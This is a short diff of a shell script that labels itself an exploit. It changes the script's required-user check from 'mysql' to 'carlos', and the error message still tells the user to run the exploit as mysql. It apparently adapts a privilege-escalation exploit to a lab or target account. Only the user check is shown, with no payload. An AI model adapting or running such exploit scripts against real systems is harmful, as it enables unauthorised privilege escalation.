@@ -82,7 +82,7 @@ fi
 # Priv check
 
 echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"
-id | grep -q mysql 
+id | grep -q carlos 
 if [ $? -ne 0 ]; then
 	echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n"
 	exit 3
